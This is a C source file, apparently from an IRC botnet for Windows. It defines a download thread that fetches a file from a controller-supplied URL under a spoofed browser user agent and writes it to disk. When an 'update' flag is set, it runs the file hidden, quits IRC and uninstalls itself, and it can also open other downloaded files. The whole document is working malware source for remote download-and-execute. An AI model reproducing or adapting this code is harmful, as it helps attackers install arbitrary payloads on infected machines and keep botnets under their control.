#include "include.h"
#include "extern.h"

DWORD WINAPI download(void *param)
/* downloads a file from the internet */
{
	unsigned long r;
	unsigned long w;
	char buffer[4096];
	struct dls dl = *(struct dls *)param;
	struct dls *pdl = (struct dls *)param;
	HINTERNET ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	HINTERNET fh = InternetOpenUrl(ih, dl.url, 0, 0, 0, 0);
	pdl->gotinfo = true;
	if(fh)
	{
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
		if(!f)
		{
			clearthread(dl.tnum);
			ExitThread(0);
		}
		do
		{
			InternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &w, 0);
		}
		while(r > 0);
		CloseHandle(f);
		InternetCloseHandle(fh);
		InternetCloseHandle(ih);
		if(dl.update) /* update to new bot */
		{
			ShellExecute(0, "open", dl.dest, 0, 0, SW_HIDE);
			irc_send("QUIT");
			uninstall();
		}
		else if(dl.run) /* open file */
			ShellExecute(0, "open", dl.dest, 0, 0, SW_SHOW);
	}
	clearthread(dl.tnum);
	ExitThread(0);
return 0;
}